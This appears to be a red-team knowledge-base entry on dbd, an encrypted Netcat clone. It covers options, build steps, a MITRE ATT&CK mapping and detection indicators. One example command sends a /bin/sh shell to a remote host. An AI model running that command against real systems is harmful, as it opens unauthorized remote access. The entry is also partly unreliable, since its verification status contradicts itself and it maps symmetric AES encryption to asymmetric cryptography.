---
id: a0eaf1f0-d804-4d46-b276-cc08df21b5c7
name: dbd
type: tool
verified: true
created_at: '2019-08-28T21:17:26.677099Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - network
  - encryption
  - netcat-clone
url: 'https://github.com/elfmaster/dbd'
validated: true
---

# dbd

**Status**: Unverified

## Overview

dbd is a portable Netcat clone designed for security testing, offering strong encryption for network communications. It supports Unix-like operating systems and Microsoft Win32, making it suitable for cross-platform TCP/IP-based operations like port scanning, data transfer, and remote execution in red team exercises.

## Description

dbd provides encrypted TCP connections using AES-CBC-128 + HMAC-SHA1 (implemented by Christophe Devine), ensuring secure data transmission. Key features include program execution on connection (-e option), source port specification, continuous reconnection with configurable delays, and support for both client and server modes. It is distributed under the GNU General Public License, with source code available for compilation.

## Features

- **Strong Encryption**: AES-CBC-128 + HMAC-SHA1 for all communications.
- **Program Execution**: Execute shells or programs upon connection (-e flag).
- **Reconnection Logic**: Automatic retries with delays for persistent connections.
- **Port Flexibility**: Specify source ports and listen on custom ports.
- **Cross-Platform**: Works on Unix-like systems and Windows.
- **TCP/IP Only**: Focused on reliable, encrypted TCP streams.

## Installation

### Requirements

- GCC or compatible compiler for building from source.
- OpenSSL libraries for encryption support.
- Supported platforms: Linux (e.g., Ubuntu, Kali), Windows (Win32).

### Install Commands

```bash
# Clone or download source from repository
git clone https://github.com/elfmaster/dbd.git
cd dbd

# Compile on Linux/Ubuntu/Kali
make

# On Windows, use MinGW or Visual Studio to build from source
# Binaries may be available in releases
```

For pre-built binaries, check the official repository releases.

## Basic Usage

```bash
dbd --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -l | Listen mode (server) |
| -p PORT | Specify port |
| -e PROG | Execute program on connection |
| -r DELAY | Reconnect after delay (seconds) |
| -s PORT | Source port |

## Examples

### Example 1: Basic Usage (Listen)

```bash
dbd -l -p 4444
```

### Example 2: Advanced Usage (Connect with Execution)

```bash
dbd -e /bin/sh 192.168.1.100 4444
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Asymmetric Cryptography]] Encrypted Channel: Asymmetric Cryptography (for secure C2)
- [[Windows Command Shell]] Command and Scripting Interpreter: Windows Command Shell (via -e)

### Tactics

- [[Command and Control]] Command and Control
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Network traffic showing AES-CBC-128 + HMAC-SHA1 patterns (if unencrypted endpoints are monitored).
- Unusual TCP connections from known dbd binaries or source ports.
- Process monitoring for dbd.exe on Windows or dbd binary on Linux spawning shells.
- Encrypted payloads in packet captures that don't match standard protocols.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Netcat]]
- [[socat]]

## References

- Official GitHub: https://github.com/elfmaster/dbd
- Original implementation notes: Christophe Devine's encryption module
